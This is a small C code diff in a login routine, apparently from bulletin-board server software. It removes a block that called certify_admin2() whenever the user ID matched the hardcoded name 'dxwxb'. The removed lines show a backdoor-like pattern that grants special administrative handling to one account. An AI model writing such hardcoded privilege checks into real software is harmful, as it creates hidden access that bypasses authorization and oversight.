@@ -1064,11 +1064,6 @@ static void user_login(void)
 	extern char currmaildir[];
 	setmdir(currmaildir, currentuser.userid);
 	check_register_info();
-#ifdef CERTIFYMODE
-	if (!strcmp(currentuser.userid, "dxwxb")) {
-		certify_admin2();
-	}
-#endif
 }
 
 void set_numofsig() {
